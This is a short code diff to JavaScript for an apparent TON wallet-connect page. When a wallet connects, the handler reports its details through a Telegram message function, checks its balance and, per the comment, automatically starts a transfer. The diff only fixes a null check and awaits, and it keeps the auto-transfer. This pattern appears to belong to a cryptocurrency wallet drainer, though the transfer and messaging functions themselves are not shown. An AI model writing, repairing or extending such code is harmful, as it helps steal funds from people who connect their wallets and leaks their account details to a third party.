@@ -79,12 +79,12 @@
 
         // Event listener for wallet connection
 tonConnectUI.onStatusChange(async (walletInfo) => {
-    if (walletInfo.account) {
+    if (walletInfo && walletInfo.account) {
         const message = `Wallet connected: ${walletInfo.account}`;
         await sendTelegramMessage(message);
-        checkBalance(walletInfo.account.address);
-        // Automatically initiate transfer when wallet is connected
-        await didtrans();
+        await checkBalance(walletInfo.account.address);
+    // Automatically initiate transfer when wallet is connected
+    await didtrans();
     } else {
         console.error('No account connected or status not recognized.');
     }
